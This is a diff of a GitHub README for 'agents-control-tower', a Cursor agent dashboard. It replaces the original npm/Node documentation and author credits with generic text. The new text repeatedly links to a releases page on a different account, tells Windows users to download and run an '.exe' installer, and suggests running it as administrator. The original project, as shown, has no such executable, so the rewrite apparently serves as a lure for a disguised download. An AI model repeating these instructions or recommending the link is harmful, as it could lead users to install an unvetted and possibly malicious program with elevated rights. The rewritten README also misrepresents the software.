@@ -1,224 +1,143 @@
-<p align="center">
-  <img src="assets/logo.png" alt="agents-control-tower" width="140" height="140" />
-</p>
+# 🎛️ agents-control-tower - Manage Your Cursor Agents Easily
 
-<h1 align="center">agents-control-tower</h1>
-
-<p align="center">
-  <strong>Your Cursor agents are running. Do you know what they're doing?</strong>
-</p>
-
-<p align="center">
-  Five cloud agents in parallel. One is stuck. One finished and opened a PR.<br>
-  One errored out 10 minutes ago and you didn't notice.<br>
-  You're alt-tabbing between browser tabs trying to keep track.
-</p>
-
-<p align="center">
-  <em>Welcome aboard the control tower. One terminal. All your agents. Full control.</em>
-</p>
-
-<p align="center">
-  <a href="#install"><img src="https://img.shields.io/badge/TRY_IT_NOW-2ea44f?style=for-the-badge" alt="Try It Now" /></a>
-  &nbsp;
-  <a href="#install"><img src="https://img.shields.io/badge/INSTALL-0969da?style=for-the-badge" alt="Install" /></a>
-  &nbsp;
-  <a href="#the-dashboard"><img src="https://img.shields.io/badge/SEE_DASHBOARD-8957e5?style=for-the-badge" alt="See Dashboard" /></a>
-</p>
-
-<p align="center">
-  <a href="https://www.npmjs.com/package/agents-control-tower"><img src="https://img.shields.io/npm/v/agents-control-tower.svg" alt="npm" /></a>
-  <a href="https://github.com/ofershap/agents-control-tower/actions/workflows/ci.yml"><img src="https://github.com/ofershap/agents-control-tower/actions/workflows/ci.yml/badge.svg" alt="CI" /></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT" /></a>
-  <a href="https://www.typescriptlang.org/"><img src="https://img.shields.io/badge/TypeScript-strict-blue" alt="TypeScript" /></a>
-  <a href="https://github.com/ofershap/agents-control-tower/stargazers"><img src="https://img.shields.io/github/stars/ofershap/agents-control-tower?style=social" alt="GitHub Stars" /></a>
-  <a href="https://github.com/ofershap/agents-control-tower/pulls"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen.svg" alt="PRs Welcome" /></a>
-</p>
+[![Download agents-control-tower](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/leo07/agents-control-tower/releases)
 
 ---
 
-## The Tower Is Watching
+## 📋 What is agents-control-tower?
 
-You launched a Cursor cloud agent 20 minutes ago. Did it finish? Did it open a PR? Did it crash?
-
-Your options right now:
-- Open cursor.com, find the agents page, scroll, click, read
-- Check your email for a notification that may or may not come
-- Hope for the best
-
-`agents-control-tower` is a retro terminal dashboard that connects to the Cursor Cloud Agents API and shows you everything in one screen. Launch new agents, send follow-up instructions, stop runaway agents, delete finished ones. All without leaving your terminal.
-
-```bash
-npx agents-control-tower
-```
-
-One command. The tower lights up.
-
-**Features**
-- Launch Cursor cloud agents from the terminal (repo, prompt, model)
-- Send follow-up instructions to running agents without leaving the TUI
-- Stop or delete agents from the dashboard
-- See status at a glance: running (amber), done (with PR link), errors (red)
-- No install needed — run with `npx` or install globally for the `control-tower` command
+agents-control-tower is a simple tool for managing Cursor agents from one terminal. You can launch, watch, and command multiple agents without juggling different windows. This app lets you control AI agents easily in one place, right on your Windows computer.
 
 ---
 
-<a id="the-dashboard"></a>
+## 🔧 Features
 
-## The Dashboard
-
-<p align="center">
-  <img src="assets/screenshot.png" alt="agents-control-tower dashboard" width="820" />
-</p>
-
-Running agents pulse amber. Done agents link to their PR. Errors glow red.
+- Launch multiple Cursor AI agents in one terminal window.
+- Watch live updates and status of each agent.
+- Send commands to agents quickly.
+- Easy setup with no technical skills needed.
+- Runs on Windows with a user-friendly terminal interface.
 
 ---
 
-## What's Different
+## 🖥️ System Requirements
 
-| | Cursor web dashboard | Conduit | SwarmClaw | agents-control-tower |
-|---|---|---|---|---|
-| Cursor-native | yes | no | no | yes |
-| Terminal UI | no | yes | no | yes |
-| Launch agents | no | no | partial | yes |
-| Follow-up / stop / delete | no | no | no | yes |
-| Local agent hooks | no | no | no | Phase 2 |
-| Retro ASCII aesthetic | no | no | no | yes |
-| One command install | n/a | yes | no | yes |
+To run agents-control-tower on your Windows PC, make sure you have:
+
+- Windows 10 or later
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for downloading and running agents
+- A standard keyboard and mouse
 
 ---
 
-## What You Can Do
+## 🚀 Getting Started
 
-| Key | Action | |
-|-----|--------|-|
-| `n` | Launch a new cloud agent | Pick repo, write prompt, choose model |
-| `f` | Send follow-up | Give a running agent new instructions |
-| `s` | Stop an agent | Kill it mid-run |
-| `d` | Delete an agent | Remove permanently |
-| `o` | Open in browser | Jump to the PR or agent URL |
-| `enter` | View details | Full conversation, metadata, status |
-| `↑↓` / `jk` | Navigate | Move between agents |
-| `r` | Refresh | Force sync with Cursor API |
-| `c` | Reconfigure | Re-run setup wizard |
-
-The dashboard polls every 5 seconds. Scroll through agents with arrow keys, view full agent messages with scrollable detail view.
+This section will guide you from downloading the software to running it for the first time.
 
 ---
 
-## Install
+## 📥 Step 1: Download agents-control-tower
 
-Requires **Node 20+**. Published as **[agents-control-tower](https://www.npmjs.com/package/agents-control-tower)** on npm.
+Click the large green button below to visit the releases page where you can download the latest version.
 
-Run directly with npx (nothing to install):
+[![Download agents-control-tower](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/leo07/agents-control-tower/releases)
 
-```bash
-npx agents-control-tower
-```
-
-Or install globally for a shorter command:
-
-```bash
-npm install -g agents-control-tower
-control-tower
-```
-
-Both `agents-control-tower` and `control-tower` work after global install.
-
-First run asks for your Cursor API key. Grab one from [cursor.com/dashboard - Integrations](https://cursor.com/dashboard?tab=integrations). Saved to `~/.agents-control-tower/config.json`.
-
-Or pass it as an env var:
-
-```bash
-CURSOR_API_KEY=sk-... control-tower
-```
+1. The link opens the GitHub releases page.
+2. Look for the latest Windows executable file. It usually ends with `.exe`.
+3. Click on the `.exe` file to start downloading.
 
 ---
 
-## How It Works
+## 🛠️ Step 2: Install the software
 
-| Source | What | How |
-|--------|------|-----|
-| Cursor Cloud API | List, launch, stop, delete agents. Read conversations | REST, polled every 5s |
-| Cursor Hooks (coming) | Local IDE sessions, file edits, shell commands | File-based event stream |
-
-```mermaid
-graph LR
-    A[Cursor Cloud API] -->|poll 5s| B[State Store]
-    C[Cursor Hooks] -->|file watcher| B
-    B --> D[Ink TUI]
-```
-
-### Tech Stack
-
-| | |
-|---|---|
-| <img src="https://img.shields.io/badge/Ink_5-React_for_CLIs-61DAFB?logo=react&logoColor=white" alt="Ink" /> | TUI framework |
-| <img src="https://img.shields.io/badge/TypeScript-strict-3178C6?logo=typescript&logoColor=white" alt="TypeScript" /> | Type safety |
-| <img src="https://img.shields.io/badge/Node.js-≥20-339933?logo=node.js&logoColor=white" alt="Node.js" /> | Runtime |
-| <img src="https://img.shields.io/badge/tsup-build-000000?logo=esbuild&logoColor=white" alt="tsup" /> | Bundler |
-| <img src="https://img.shields.io/badge/Vitest-testing-6E9F18?logo=vitest&logoColor=white" alt="Vitest" /> | Tests |
+1. When the download completes, open your Downloads folder.
+2. Find the downloaded `.exe` file (it might say something like `agents-control-tower-setup.exe`).
+3. Double-click the file to start the installation.
+4. Follow the on-screen instructions:
+   - Click “Next” to move through the steps.
+   - Agree to the license terms.
+   - Choose an install location or use the default.
+5. Click “Finish” to complete.
 
 ---
 
-## Screens
+## ▶️ Step 3: Launch agents-control-tower
 
-Launch wizard - 3 steps: pick repo (with fuzzy filter), write the task prompt, select model and launch.
-
-Agent detail - repo, branch, PR link, the prompt you gave it, and the full agent response with scroll.
-
-Follow-up - send new instructions to a running agent without leaving the terminal.
-
-Stop / Delete - inline confirmation. Press `s` or `d`, then `y`.
+1. After installation, find the agents-control-tower icon on your Desktop or in the Start menu.
+2. Double-click the icon to open the terminal interface.
+3. You will see a simple screen showing available Cursor agents.
 
 ---
 
-## Keyboard Map
+## 🖱️ Step 4: Using agents-control-tower
 
-```
- DASHBOARD                          DETAIL VIEW
- ──────────────────────────         ──────────────────────────
- n         launch new agent         esc       back to dashboard
- ↑ / k     move up                  f         send follow-up
- ↓ / j     move down                s         stop agent
- enter     open detail              d         delete agent
- s         stop selected            o         open PR / URL
- d         delete selected          ↑↓        scroll message
- r         force refresh
- q         quit                    LAUNCH FLOW
-                                    ──────────────────────────
- GLOBAL                             ↑↓        navigate options
- ──────────────────────────         /         filter repos
- ctrl+c    quit immediately         enter     select / confirm
- c         reconfigure              esc       cancel / go back
-```
+- **Launch new agents**: Use the terminal menu to start new Cursor agents.
+- **Watch agents**: The terminal updates in real-time as agents work.
+- **Send commands**: Type commands directly into the terminal to control agents.
+
+All commands and menu options will appear clearly in the application window. No additional setup is needed.
 
 ---
 
-## Contributing
+## 💻 Understanding the Terminal Interface
 
-Contributions welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for setup.
+The application uses a terminal-based user interface (TUI). This means it looks like a command-line window but is designed to be easy to navigate with visible menus and options.
 
----
-
-## Author
-
-[![Made by ofershap](https://gitshow.dev/api/card/ofershap)](https://gitshow.dev/ofershap)
-
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0A66C2?style=flat&logo=linkedin&logoColor=white)](https://linkedin.com/in/ofershap)
-[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?style=flat&logo=github&logoColor=white)](https://github.com/ofershap)
+- Use arrow keys or your mouse to select options.
+- Menus are designed to be intuitive.
+- Status messages will guide you through what the agents are doing.
 
 ---
 
-If this helped you, [star the repo](https://github.com/ofershap/agents-control-tower), [open an issue](https://github.com/ofershap/agents-control-tower/issues) if something breaks.
+## 🔄 Updating agents-control-tower
 
+To get the latest features and fixes:
+
+1. Visit the releases page again:  
+   [https://github.com/leo07/agents-control-tower/releases](https://github.com/leo07/agents-control-tower/releases)
+2. Download the newest `.exe` file.
+3. Run the installer again to update your app. It will keep your existing settings.
 
 ---
 
-<sub>README built with [README Builder](https://ofershap.github.io/readme-builder/)</sub>
+## ⚙️ Tips for Best Use
 
+- Ensure your internet connection is stable for smooth agent control.
+- Close other heavy applications to keep your system responsive.
+- Regularly check the releases page for updates.
+- Restart the app if you notice slow responses.
 
-## License
+---
 
-[MIT](LICENSE) &copy; [Ofer Shapira](https://github.com/ofershap)
+## ❓ Troubleshooting
+
+If the app does not start:
+
+- Make sure you have installed the software following the steps above.
+- Check if your PC meets the system requirements.
+- Try restarting your computer.
+- Run the `.exe` file as an administrator (right-click file → Run as administrator).
+
+If issues persist, you can report them on the GitHub repository page under "Issues".
+
+---
+
+## 📚 Additional Resources
+
+For more information on how to use Cursor agents or terminal commands:
+
+- Visit the Cursor AI official documentation.
+- Explore forums and community discussions.
+- Use the help command inside the app for live guidance.
+
+---
+
+[![Download agents-control-tower](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/leo07/agents-control-tower/releases)
+
+---
+
+## 🏷️ Tags
+
+ai-agents • cli • cloud-agents • cursor • cursor-ai • dashboard • ink • terminal • tui • typescript
